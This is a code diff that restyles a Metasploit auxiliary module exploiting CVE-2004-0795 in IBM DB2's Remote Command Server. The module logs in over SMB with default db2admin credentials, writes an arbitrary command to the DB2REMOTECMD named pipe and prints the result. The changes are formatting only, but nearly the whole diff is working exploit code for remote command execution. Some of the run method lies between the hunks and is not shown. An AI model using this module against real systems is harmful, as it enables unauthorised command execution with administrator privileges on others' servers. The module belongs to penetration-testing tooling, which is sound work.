@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,46 +7,45 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::SMB::Client
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'IBM DB2 db2rcmd.exe Command Execution Vulnerability',
-      'Description'    => %q{
-          This module exploits a vulnerability in the Remote Command Server
-          component in IBM's DB2 Universal Database 8.1. An authenticated
-          attacker can send arbitrary commands to the DB2REMOTECMD named pipe
-          which could lead to administrator privileges.
-      },
-      'Author'         => [ 'MC' ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
-          [ 'CVE', '2004-0795' ],
-          [ 'OSVDB', '4180' ],
-          [ 'BID', '9821' ],
-        ],
-      'DisclosureDate' => 'Mar 4 2004'))
+                      'Name'           => 'IBM DB2 db2rcmd.exe Command Execution Vulnerability',
+                      'Description'    => %q(
+                          This module exploits a vulnerability in the Remote Command Server
+                          component in IBM's DB2 Universal Database 8.1. An authenticated
+                          attacker can send arbitrary commands to the DB2REMOTECMD named pipe
+                          which could lead to administrator privileges.
+                      ),
+                      'Author'         => [ 'MC' ],
+                      'License'        => MSF_LICENSE,
+                      'References'     =>
+                        [
+                          [ 'CVE', '2004-0795' ],
+                          [ 'OSVDB', '4180' ],
+                          [ 'BID', '9821' ]
+                        ],
+                      'DisclosureDate' => 'Mar 4 2004'))
 
-      register_options(
-        [
-          OptString.new('CMD', [ true, 'The command to execute', 'ver']),
-          OptString.new('SMBUser', [ true, 'The username to authenticate as', 'db2admin']),
-          OptString.new('SMBPass', [ true, 'The password for the specified username', 'db2admin'])
-        ], self.class )
+    register_options(
+      [
+        OptString.new('CMD', [ true, 'The command to execute', 'ver']),
+        OptString.new('SMBUser', [ true, 'The username to authenticate as', 'db2admin']),
+        OptString.new('SMBPass', [ true, 'The password for the specified username', 'db2admin'])
+      ], self.class
+    )
   end
 
   def run
-
     print_status("Connecting to the server...")
-    connect()
+    connect
 
     print_status("Authenticating as user '#{datastore['SMBUser']}' with pass '#{datastore['SMBPass']}'...")
 
     # Connect with a valid user/pass. if not, then bail.
     begin
-      smb_login()
+      smb_login
     rescue ::Exception => e
       print_error("Error: #{e}")
       disconnect
@@ -79,12 +79,11 @@ class MetasploitModule < Msf::Auxiliary
     pipe.write(rcmd)
 
     # Read from the pipe and give us the data.
-    res = pipe.read()
+    res = pipe.read
     print_line(res)
 
     # Close the named pipe and disconnect from the socket.
     pipe.close
     disconnect
-
   end
 end
